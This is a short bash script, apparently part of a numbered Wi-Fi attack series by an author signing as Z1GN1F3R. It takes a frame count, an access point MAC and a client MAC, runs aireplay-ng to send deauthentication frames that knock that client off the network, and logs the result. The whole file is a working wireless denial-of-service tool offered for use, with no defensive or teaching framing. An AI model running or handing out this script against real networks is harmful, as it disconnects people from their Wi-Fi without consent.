#!/bin/bash
##############################################################
#
#       03-DeauthClnt.sh - Deauth a client from AP
#
#           AUTHOR: Z1GN1F3R =D
#
#           DATE: 01-27-2021
#   
#           DESCRIPTION: 
#
#
##############################################################

#$DEAUTH=$1
#$MACTARGET=$2
#$CLIENTMACTARGET=$3



#Welcome
    clear
    echo "-----readme.txt -----"
    echo ""
    echo ""
    echo "    LEAVE ME HERE"
    echo ""
    echo ""
    echo "-----readme.txt -----"
    echo ""
    echo ""
    echo "-----> INFORMATION OF ATTACK"
    echo ""
    echo "DEAUTH: $1 times"
    echo "AP MAC: $2"
    echo "CL MAC: $3"
    echo ""
    echo "-----------------------------"
    
#Disconnecting client

    aireplay-ng --deauth $1 -a $2 -c $3 mon0 | tee log-03-DeauthClnt.txt
    
#Show the results
    echo ""
    echo ""
    echo ""
    echo "--- RESULTS ---"
    ls -1 log-03-DeauthClnt*
    echo "--- END ---"    
    
